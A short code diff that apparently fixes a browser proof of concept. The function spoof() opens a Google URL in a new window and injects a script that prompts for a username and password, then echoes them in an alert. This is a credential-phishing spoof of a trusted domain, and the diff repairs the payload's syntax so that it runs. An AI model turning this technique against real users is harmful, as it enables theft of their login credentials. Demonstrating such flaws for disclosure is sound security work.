@@ -7,14 +7,15 @@
     function spoof() {
       let win = window.open("https://www.google.com/gen_204", "_blank");
 
-      let payload =
+      let payload = `
           <script>
             setTimeout(() => {
               let u = prompt('Enter your username:');
               let p = prompt('Enter your password:');
               alert('Your creds:\\nUsername: ' + u + '\\nPassword: ' + p);
-            }, 500);
-          </script>
+            }, 50);
+          <\/script>
+      `;
 
       setTimeout(() => {
         try {
